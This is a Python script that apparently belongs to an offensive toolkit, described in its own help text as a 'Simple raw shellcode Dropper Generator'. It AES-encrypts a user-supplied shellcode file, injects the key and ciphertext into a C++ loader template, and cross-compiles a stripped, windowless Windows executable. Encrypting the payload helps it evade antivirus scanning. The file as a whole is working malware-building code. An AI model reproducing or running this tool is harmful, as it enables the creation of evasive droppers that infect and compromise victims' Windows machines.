#!/usr/bin/python3
import sys
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from Crypto.Random import get_random_bytes
import hashlib
import os
from colorama import Fore
import argparse

SHELLCODE_MARK = "Insert Shellcode Here"
archs = {"1":"x64", "2":"x86"}


def printS(text):
    print(f"""{Fore.GREEN}[+]{Fore.WHITE} {text}""")
def printE(text):
    print(f"""{Fore.RED}[!]{Fore.WHITE} {text}""")
def printI(text):
    print(f"""{Fore.BLUE}[*]{Fore.WHITE} {text}""")

def writeToFile(mark, data, i):
    # i is number of lines after mark. Starts from 0!
    line = True
    lineCount = 1
    with open("sources/code.cpp","r") as code:
        while line:
            line = code.readline()
            if mark in line:
                break
            lineCount += 1

    targetLine = lineCount
    with open("sources/code.cpp", "r") as a_file:
        list_of_lines = a_file.readlines()
        list_of_lines[targetLine + i] = f"        {data}\n"

    with open("sources/code.cpp", "w") as a_file:
        a_file.writelines(list_of_lines)

def encrypt(plaintext):
    KEY = get_random_bytes(16)
    iv = 16 * b'\x00'
    cipher = AES.new(hashlib.sha256(KEY).digest(), AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))

    key = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in KEY) + ' };'
    payload = '{ 0x' + ', 0x'.join(hex(x)[2:] for x in ciphertext) + ' };'

    return key, payload

def main():

    parser = argparse.ArgumentParser(description="Simple raw shellcode Dropper Generator")
    parser.add_argument("binaryName", help="File name contains raw shellcode")
    parser.add_argument("-a", "--arch", default="1", help="Shellcode Architecture (1=x64, 2=x86) (default=x64)")
    args = parser.parse_args()

    binaryName = args.binaryName
    try:
        Arch = archs[args.arch]
    except KeyError:
        printE("Invalid Arch...!")
        sys.exit(1)

    # Encrypting provided binary
    try:
        binaryData = open(binaryName, "rb").read()
    except FileNotFoundError:
        printE("No such file in directory!")
        sys.exit(1)

    printI(f"Generating {Arch} Dropper for {binaryName}")

    binaryKey, binaryPayload = encrypt(binaryData)
    writeToFile(SHELLCODE_MARK, rf"// {binaryName}", 0)
    writeToFile(SHELLCODE_MARK, f"unsigned char key[] = {binaryKey}", 1)
    writeToFile(SHELLCODE_MARK, f"unsigned char shellcode[] = {binaryPayload}", 2)

    # Compiling Code
    if Arch == "x64":
        os.system(f"x86_64-w64-mingw32-g++ sources/code.cpp -o output/{binaryName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
    elif Arch == "x86":
        os.system(f"i686-w64-mingw32-g++ sources/code.cpp -o output/{binaryName}.exe -lurlmon -lntdll -mwindows -s -ffunction-sections -fdata-sections -Wno-write-strings -Wconversion-null -Wnarrowing -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")
    os.system(f"/usr/bin/cp sources/code.cpp output/{binaryName}.cpp")

    os.system("/usr/bin/cp sources/code.cpp.bak sources/code.cpp")

    printS(f"Executable saved to output/{binaryName}.exe")

if __name__ == "__main__":
    main()
